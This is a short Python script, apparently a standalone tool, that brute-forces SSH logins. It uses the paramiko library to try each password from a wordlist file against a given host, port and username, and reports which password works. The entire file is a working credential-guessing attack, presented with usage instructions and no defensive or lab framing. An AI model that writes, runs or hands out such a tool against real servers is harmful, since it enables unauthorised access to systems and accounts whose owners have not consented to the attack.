#!/usr/bin/python

import paramiko

def passw(filename):
#read passwords from file, one line = one pass	
	text = open(filename).read()
	pass_list = text.split('\n')
	return pass_list

def ssh_connect(host, port, login, password):
#connect to ssh with paramiko, if connect failed we will have exception
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(hostname=host, username=login, password=password, port=int(port))
	client.close()

def main(host, port, login, pass_file_name):
#if password is correct function will stop	
	pass_list = passw(pass_file_name)
	for cur_pass in pass_list:
		try:
			ssh_connect(host, port, login, cur_pass)
		except:
			print "password %s failed" % cur_pass
		else:
			print "password %s GOOD" % cur_pass
			break 	

if __name__ == '__main__':
	import sys
	if len(sys.argv) != 5:
		print "Usage %s host port user_name pass_file_name" % str(sys.argv[0])
	else:
		main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

